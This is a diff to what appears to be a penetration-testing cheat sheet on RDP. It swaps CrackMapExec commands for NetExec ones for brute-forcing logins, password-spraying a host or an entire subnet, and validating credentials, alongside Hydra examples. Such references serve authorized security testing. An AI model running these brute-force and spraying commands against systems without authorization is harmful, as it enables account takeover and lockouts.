@@ -38,8 +38,8 @@ When bruteforcing accounts, you may lock accounts
 #Hydra
 hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
 
-#CrackmapExec
-crackmapexec rdp <IP> -u <userlist> -p <passwlist>
+#NetExec
+netexec rdp <IP> -u <userlist> -p <passwlist>
 ```
 {% endtab %}
 
@@ -50,11 +50,11 @@ We can use following commands to password spray
 #Hydra
 hydra -L <userslist> -p 'password123' rdp://<IP>
 
-#Crackmapexec - Spray on target
-crackmapexec rdp <IP> -u <userlist> -p 'password123'
+#NetExec - Spray on target
+netexec rdp <IP> -u <userlist> -p 'password123'
 
-#Crackmapexec - Spray on subnet
-crackmapexec rdp 10.10.10.0/24 -u <userlist> -p 'password123'
+#NetExec - Spray on subnet
+netexec rdp 10.10.10.0/24 -u <userlist> -p 'password123'
 ```
 {% endtab %}
 
@@ -94,11 +94,11 @@ python rdp_check.py <domain>/<name>:<password>@<IP>
 ```
 {% endtab %}
 
-{% tab title="crackmapexec" %}
-Using [crackmapexec](https://github.com/mpgn/CrackMapExec), we can check if some credentials are valid for a RDP service
+{% tab title="netexec" %}
+Using [netexec](https://github.com/mpgn/NetExec), we can check if some credentials are valid for a RDP service
 
 ```bash
-crackmapexec rdp <IP> -u <user> -p <password>
+netexec rdp <IP> -u <user> -p <password>
 ```
 {% endtab %}
 {% endtabs %}
